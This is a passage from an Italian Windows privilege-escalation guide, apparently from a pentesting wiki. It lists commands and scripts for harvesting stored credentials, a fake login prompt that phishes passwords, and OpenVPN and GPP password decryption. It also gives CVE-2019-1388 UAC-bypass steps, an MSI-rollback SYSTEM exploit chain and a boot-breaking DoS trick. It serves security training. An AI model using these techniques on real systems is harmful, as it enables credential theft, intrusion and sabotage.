if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Verifica se esiste `C:\Windows\CCM\SCClient.exe` .\
Gli installer vengono **eseguiti con privilegi SYSTEM**; molti sono vulnerabili al **DLL Sideloading (informazioni da** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## File e Registro (Credenziali)

### Credenziali Putty
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Chiavi host SSH di PuTTY
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Chiavi SSH nel registro

Le chiavi private SSH possono essere memorizzate nella chiave di registro `HKCU\Software\OpenSSH\Agent\Keys`, quindi dovresti verificare se al suo interno è presente qualcosa di interessante:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Se trovi una voce all'interno di quel percorso, probabilmente si tratta di una chiave SSH salvata. È memorizzata in forma crittografata, ma può essere facilmente decrittografata usando [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Ulteriori informazioni su questa tecnica sono disponibili qui: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Se il servizio `ssh-agent` non è in esecuzione e vuoi che si avvii automaticamente all'avvio, esegui:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Sembra che questa tecnica non sia più valida. Ho provato a creare alcune chiavi SSH, ad aggiungerle con `ssh-add` e ad accedere tramite SSH a una macchina. Il registro HKCU\Software\OpenSSH\Agent\Keys non esiste e procmon non ha identificato l'utilizzo di `dpapi.dll` durante l'autenticazione con chiave asimmetrica.

### File unattended
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Puoi anche cercare questi file usando **metasploit**: _post/windows/gather/enum_unattend_

Contenuto di esempio:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Backup di SAM e SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Credenziali Cloud
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Cerca un file chiamato **SiteList.xml**

### Password GPP memorizzata nella cache

In precedenza era disponibile una funzionalità che consentiva la distribuzione di account di amministratore locali personalizzati su un gruppo di macchine tramite Group Policy Preferences (GPP). Tuttavia, questo metodo presentava significative vulnerabilità di sicurezza. Innanzitutto, i Group Policy Objects (GPO), archiviati come file XML in SYSVOL, erano accessibili a qualsiasi utente del dominio. Inoltre, le password all'interno di questi GPP, crittografate con AES256 utilizzando una chiave predefinita documentata pubblicamente, potevano essere decrittografate da qualsiasi utente autenticato. Ciò comportava un rischio significativo, poiché poteva consentire agli utenti di ottenere privilegi elevati.

Per mitigare questo rischio, è stata sviluppata una funzione per cercare i file GPP memorizzati localmente contenenti un campo "cpassword" non vuoto. Quando trova un file di questo tipo, la funzione decrittografa la password e restituisce un oggetto PowerShell personalizzato. Questo oggetto include dettagli sul GPP e sulla posizione del file, facilitando l'identificazione e la risoluzione di questa vulnerabilità di sicurezza.

Cerca questi file in `C:\ProgramData\Microsoft\Group Policy\history` oppure in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (precedente a W Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Per decrittografare il cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Utilizzo di crackmapexec per ottenere le password:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### Configurazione Web di IIS
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Esempio di web.config con credenziali:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Credenziali OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Log
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Richiedere le credenziali

Puoi sempre **chiedere all'utente di inserire le sue credenziali o persino quelle di un altro utente** se pensi che possa conoscerle (nota che **chiedere** direttamente al client le **credenziali** è davvero **rischioso**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Possibili nomi di file contenenti credenziali**

File noti che in passato contenevano **password** in **testo in chiaro** o **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Cerca in tutti i file proposti:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credenziali nel Cestino

Dovresti controllare anche il Cestino per cercare credenziali al suo interno

Per **recuperare le password** salvate da diversi programmi puoi usare: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### All'interno del registro

**Altre possibili chiavi del registro con credenziali**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Estrai le chiavi openssh dal registro.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Cronologia dei browser

Dovresti controllare i db in cui sono archiviate le password di **Chrome o Firefox**.\
Controlla anche la cronologia, i segnalibri e i preferiti dei browser, poiché potrebbero contenere alcune **password**.

Tools per estrarre le password dai browser:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** è una tecnologia integrata nel sistema operativo Windows che consente l'**intercomunicazione** tra componenti software scritti in linguaggi diversi. Ogni componente COM è **identificato tramite un class ID (CLSID)** e ogni componente espone funzionalità tramite una o più interfacce, identificate dagli interface ID (IID).

Le classi e le interfacce COM sono definite nel registro rispettivamente sotto **HKEY\CLASSES\ROOT\CLSID** e **HKEY\CLASSES\ROOT\Interface**. Questo registro viene creato unendo **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

All'interno dei CLSID di questo registro puoi trovare il registro secondario **InProcServer32**, che contiene un **valore predefinito** che punta a una **DLL** e un valore chiamato **ThreadingModel**, che può essere **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single o Multi) oppure **Neutral** (Thread Neutral).

![Cronologia dei browser - COM DLL Overwriting: All'interno dei CLSID di questo registro puoi trovare il registro secondario InProcServer32, che contiene un valore predefinito che punta a una DLL e un valore...](<../../images/image (729).png>)

In sostanza, se puoi **sovrascrivere una qualsiasi delle DLL** che verranno eseguite, potresti **escalare i privilegi** se quella DLL viene eseguita da un utente diverso.

Per scoprire come gli attaccanti usano COM Hijacking come meccanismo di persistenza, consulta:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Ricerca generica di password nei file e nel registro**

**Cerca i contenuti dei file**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Cerca un file con un determinato nome**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Cerca nel registro nomi delle chiavi e password**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Strumenti che cercano le password

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **è un plugin msf** che ho creato per **eseguire automaticamente ogni modulo POST di metasploit che cerca credenziali** all'interno della vittima.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) cerca automaticamente tutti i file contenenti le password menzionate in questa pagina.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) è un altro ottimo strumento per estrarre password da un sistema.

Lo strumento [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) cerca **sessioni**, **username** e **password** di diversi strumenti che salvano questi dati in testo in chiaro (PuTTY, WinSCP, FileZilla, SuperPuTTY e RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Immagina che **un processo in esecuzione come SYSTEM apra un nuovo processo** (`OpenProcess()`) **con accesso completo**. Lo stesso processo **crea anche un nuovo processo** (`CreateProcess()`) **con privilegi bassi, ma che eredita tutti gli handle aperti del processo principale**.\
Quindi, se hai **accesso completo al processo con privilegi bassi**, puoi recuperare l'**handle aperto al processo privilegiato creato** con `OpenProcess()` e **iniettare uno shellcode**.\
[Leggi questo esempio per maggiori informazioni su **come rilevare ed exploitare questa vulnerabilità**.](leaked-handle-exploitation.md)\
[Leggi quest'altro post per una spiegazione più completa su come testare e abusare di altri handle aperti di processi e thread ereditati con diversi livelli di autorizzazioni (non solo accesso completo)](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

I segmenti di memoria condivisa, chiamati **pipe**, consentono la comunicazione e il trasferimento di dati tra processi.

Windows offre una funzionalità chiamata **Named Pipes**, che permette a processi non correlati di condividere dati, anche attraverso reti diverse. Questo ricorda un'architettura client/server, con ruoli definiti come **named pipe server** e **named pipe client**.

Quando un **client** invia dati attraverso una pipe, il **server** che ha configurato la pipe ha la possibilità di **assumere l'identità** del **client**, a condizione che disponga dei diritti **SeImpersonate** necessari. Identificare un **processo privilegiato** che comunica tramite una pipe che puoi imitare offre l'opportunità di **ottenere privilegi più elevati**, adottando l'identità di quel processo quando interagisce con la pipe da te stabilita. Per istruzioni su come eseguire un attacco di questo tipo, sono disponibili guide utili [**qui**](named-pipe-client-impersonation.md) e [**qui**](#from-high-integrity-to-system).

Inoltre, il seguente tool consente di **intercettare una comunicazione named pipe con un tool come burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **e questo tool consente di elencare e visualizzare tutte le pipe per trovare privesc** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Il servizio Telephony (TapiSrv), in modalità server, espone `\\pipe\\tapsrv` (MS-TRP). Un client remoto autenticato può abusare del percorso degli eventi asincroni basato su mailslot per trasformare `ClientAttach` in una **scrittura arbitraria di 4 byte** su qualsiasi file esistente scrivibile da `NETWORK SERVICE`, quindi ottenere i diritti di amministratore di Telephony e caricare una DLL arbitraria come servizio. Flusso completo:

- `ClientAttach` con `pszDomainUser` impostato su un percorso esistente scrivibile → il servizio lo apre tramite `CreateFileW(..., OPEN_EXISTING)` e lo usa per le scritture degli eventi asincroni.
- Ogni evento scrive l'`InitContext` controllato dall'attaccante, proveniente da `Initialize`, su quell'handle. Registra un'applicazione di linea con `LRegisterRequestRecipient` (`Req_Func 61`), attiva `TRequestMakeCall` (`Req_Func 121`), recupera tramite `GetAsyncEvents` (`Req_Func 0`), quindi annulla la registrazione/arresta il servizio per ripetere scritture deterministiche.
- Aggiungiti a `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, riconnettiti, quindi chiama `GetUIDllName` con un percorso DLL arbitrario per eseguire `TSPI_providerUIIdentify` come `NETWORK SERVICE`.

Maggiori dettagli:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Varie

### Estensioni di file che possono eseguire operazioni in Windows

Consulta la pagina **[https://filesec.io/](https://filesec.io/)**

### Abuso di Protocol handler / ShellExecute tramite renderer Markdown

I link Markdown cliccabili inoltrati a `ShellExecuteExW` possono attivare URI handler pericolosi (`file:`, `ms-appinstaller:` o qualsiasi schema registrato) ed eseguire file controllati dall'attaccante con i privilegi dell'utente corrente. Vedi:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoraggio delle command line per individuare password**

Quando ottieni una shell come utente, potrebbero essere in esecuzione scheduled task o altri processi che **passano credenziali nella command line**. Lo script seguente acquisisce le command line dei processi ogni due secondi e confronta lo stato corrente con quello precedente, mostrando tutte le differenze.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## Da Low Priv User a NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Se hai accesso all'interfaccia grafica (tramite console o RDP) e UAC è abilitato, in alcune versioni di Microsoft Windows è possibile eseguire un terminale o qualsiasi altro processo come "NT\AUTHORITY SYSTEM" da un utente senza privilegi.

Questo consente di eseguire un privilege escalation e un UAC Bypass contemporaneamente sfruttando la stessa vulnerabilità. Inoltre, non è necessario installare nulla e il binario utilizzato durante il processo è firmato ed emesso da Microsoft.

Alcuni dei sistemi interessati sono i seguenti:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Per sfruttare questa vulnerabilità, è necessario eseguire i seguenti passaggi:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Da Medium Integrity Level di Administrator a High Integrity Level / UAC Bypass

Leggi questo per **imparare a conoscere gli Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Poi **leggi questo per imparare a conoscere UAC e gli UAC bypass:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Da Arbitrary Folder Delete/Move/Rename a SYSTEM EoP

La tecnica descritta [**in questo blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) con un exploit code [**disponibile qui**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

L'attacco consiste fondamentalmente nell'abusare della funzionalità di rollback di Windows Installer per sostituire file legittimi con file malevoli durante il processo di disinstallazione. A questo scopo, l'attaccante deve creare un **malicious MSI installer** che verrà utilizzato per hijackare la cartella `C:\Config.Msi`, che in seguito verrà utilizzata da Windows Installer per memorizzare i rollback files durante la disinstallazione di altri pacchetti MSI, i cui rollback files saranno stati modificati per contenere il malicious payload.

La tecnica riassunta è la seguente:

1. **Stage 1 – Preparazione dell'Hijack (`C:\Config.Msi` vuota)**

- Step 1: Installare l'MSI
- Creare un `.msi` che installi un file innocuo (ad esempio `dummy.txt`) in una cartella scrivibile (`TARGETDIR`).
- Contrassegnare l'installer come **"UAC Compliant"**, in modo che un **non-admin user** possa eseguirlo.
- Mantenere un **handle** aperto sul file dopo l'installazione.

- Step 2: Avviare la disinstallazione
- Disinstallare lo stesso `.msi`.
- Il processo di disinstallazione inizia a spostare i file in `C:\Config.Msi` e a rinominarli in file `.rbf` (rollback backups).
- Eseguire il **poll dell'open file handle** utilizzando `GetFinalPathNameByHandle` per rilevare quando il file diventa `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- L'`.msi` include una **custom uninstall action (`SyncOnRbfWritten`)** che:
- Segnala quando il file `.rbf` è stato scritto.
- Poi **attende** un altro evento prima di continuare la disinstallazione.

- Step 4: Bloccare la cancellazione del `.rbf`
- Quando viene ricevuto il segnale, **aprire il file `.rbf`** senza `FILE_SHARE_DELETE` — questo **impedisce che venga eliminato**.
- Poi **inviare il segnale di ritorno** in modo che la disinstallazione possa terminare.
- Windows Installer non riesce a eliminare il `.rbf` e, non potendo eliminare tutti i contenuti, `C:\Config.Msi` **non viene rimossa**.

- Step 5: Eliminare manualmente il `.rbf`
- Tu (attaccante) elimini manualmente il file `.rbf`.
- Ora **`C:\Config.Msi` è vuota**, pronta per essere hijackata.

> A questo punto, **attiva la SYSTEM-level arbitrary folder delete vulnerability** per eliminare `C:\Config.Msi`.

2. **Stage 2 – Sostituzione degli Rollback Scripts con script malevoli**

- Step 6: Ricreare `C:\Config.Msi` con Weak ACLs
- Ricreare personalmente la cartella `C:\Config.Msi`.
- Impostare **weak DACLs** (ad esempio, Everyone:F) e **mantenere un handle aperto** con `WRITE_DAC`.

- Step 7: Eseguire un'altra installazione
- Installare nuovamente l'`.msi`, con:
- `TARGETDIR`: posizione scrivibile.
- `ERROROUT`: una variabile che attiva un forced failure.
- Questa installazione verrà utilizzata per attivare nuovamente il **rollback**, che legge `.rbs` e `.rbf`.

- Step 8: Monitorare i `.rbs`
- Utilizzare `ReadDirectoryChangesW` per monitorare `C:\Config.Msi` finché non compare un nuovo `.rbs`.
- Acquisirne il filename.

- Step 9: Sincronizzare prima del rollback
- L'`.msi` contiene una **custom install action (`SyncBeforeRollback`)** che:
- Segnala un evento quando viene creato il `.rbs`.
- Poi **attende** prima di continuare.

- Step 10: Riapplicare la Weak ACL
- Dopo aver ricevuto l'evento `.rbs created`:
- Windows Installer **riapplica le strong ACLs** a `C:\Config.Msi`.
- Tuttavia, poiché possiedi ancora un handle con `WRITE_DAC`, puoi **riapplicare nuovamente le weak ACLs**.

> Le ACL vengono **applicate solo all'apertura dell'handle**, quindi puoi ancora scrivere nella cartella.

- Step 11: Rilasciare `.rbs` e `.rbf` falsi
- Sovrascrivere il file `.rbs` con un **fake rollback script** che indica a Windows di:
- Ripristinare il file `.rbf` (malicious DLL) in una **privileged location** (ad esempio, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Rilasciare il tuo `.rbf` falso contenente una **malicious SYSTEM-level payload DLL**.

- Step 12: Attivare il Rollback
- Inviare il segnale dell'evento di sincronizzazione in modo che l'installer riprenda.
- Una **type 19 custom action (`ErrorOut`)** è configurata per **fallire intenzionalmente l'installazione** in un punto noto.
- Questo fa sì che inizi il **rollback**.

- Step 13: SYSTEM installa la tua DLL
- Windows Installer:
- Legge il tuo malicious `.rbs`.
- Copia la DLL `.rbf` nella target location.
- Ora hai la tua **malicious DLL in un SYSTEM-loaded path**.

- Final Step: Eseguire codice SYSTEM
- Eseguire un **trusted auto-elevated binary** (ad esempio, `osk.exe`) che carica la DLL di cui hai eseguito l'hijack.
- **Boom**: il tuo codice viene eseguito **come SYSTEM**.


### Da Arbitrary File Delete/Move/Rename a SYSTEM EoP

La tecnica principale di MSI rollback (la precedente) presuppone che tu possa eliminare un'**intera cartella** (ad esempio, `C:\Config.Msi`). Ma cosa succede se la tua vulnerability consente solo la **cancellazione arbitraria di file**?

Potresti sfruttare gli **NTFS internals**: ogni cartella ha un hidden alternate data stream chiamato:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Questo stream memorizza i **metadati dell'indice** della cartella.

Quindi, se **elimini lo stream `::$INDEX_ALLOCATION`** di una cartella, NTFS **rimuove l'intera cartella** dal filesystem.

Puoi farlo usando API standard per l'eliminazione dei file, come:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Anche se stai chiamando un'API per eliminare un *file*, questa **elimina la cartella stessa**.

### Dall'eliminazione del contenuto di una cartella a SYSTEM EoP
E se la tua primitive non ti permettesse di eliminare file/cartelle arbitrari, ma **consentisse di eliminare il *contenuto* di una cartella controllata dall'attacker**?

1. Step 1: Configura una cartella e un file esca
- Crea: `C:\temp\folder1`
- Al suo interno: `C:\temp\folder1\file1.txt`

2. Step 2: Imposta un **oplock** su `file1.txt`
- L'oplock **mette in pausa l'esecuzione** quando un processo privilegiato tenta di eliminare `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Passaggio 3: Attiva il processo SYSTEM (ad es. `SilentCleanup`)
- Questo processo esegue la scansione delle cartelle (ad es. `%TEMP%`) e tenta di eliminarne il contenuto.
- Quando raggiunge `file1.txt`, si attiva l'**oplock** e passa il controllo al tuo callback.

4. Passaggio 4: All'interno del callback dell'oplock – reindirizza l'eliminazione

- Opzione A: Sposta `file1.txt` altrove
- Questo svuota `folder1` senza interrompere l'oplock.
- Non eliminare direttamente `file1.txt` — ciò rilascerebbe prematuramente l'oplock.

- Opzione B: Converti `folder1` in una **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opzione C: Create a **symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Questo ha come obiettivo lo stream interno NTFS che memorizza i metadati della cartella: eliminarlo elimina la cartella.

5. Step 5: Rilasciare l'oplock
- Il processo SYSTEM continua e tenta di eliminare `file1.txt`.
- Ma ora, a causa della junction + symlink, sta effettivamente eliminando:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Risultato**: `C:\Config.Msi` viene eliminata da SYSTEM.

### Dalla creazione di una cartella arbitraria a un DoS permanente

Sfrutta una primitive che consente di **creare una cartella arbitraria come SYSTEM/admin** — anche se **non puoi scrivere file** o **impostare permessi deboli**.

Crea una **cartella** (non un file) con il nome di un **driver Windows critico**, ad esempio:
```
C:\Windows\System32\cng.sys
```
- Questo percorso normalmente corrisponde al driver in modalità kernel `cng.sys`.
- Se lo **pre-crei come cartella**, Windows non riesce a caricare il driver effettivo durante l'avvio.
- Windows tenta quindi di caricare `cng.sys` durante l'avvio.
- Rileva la cartella, **non riesce a risolvere il driver effettivo** e **si arresta in modo anomalo o interrompe l'avvio**.
- Non esiste alcun **fallback** né alcun **recovery** senza interventi esterni (ad esempio, riparazione dell'avvio o accesso al disco).

### Da percorsi privilegiati per log/backup + symlink OM a sovrascrittura arbitraria di file / boot DoS

Quando un **servizio privilegiato** scrive log/export in un percorso letto da una **configurazione modificabile**, reindirizza quel percorso con **symlink dell'Object Manager + mount point NTFS** per trasformare la scrittura privilegiata in una sovrascrittura arbitraria (anche **senza SeCreateSymbolicLinkPrivilege**).

**Requisiti**
- La configurazione che memorizza il percorso di destinazione è modificabile dall'attaccante (ad esempio `%ProgramData%\...\.ini`).
- Possibilità di creare un mount point verso `\RPC Control` e un symlink di file OM (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Un'operazione privilegiata che scrive in quel percorso (log, export, report).

**Example chain**
1. Leggi la configurazione per recuperare la destinazione del log privilegiato, ad esempio `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
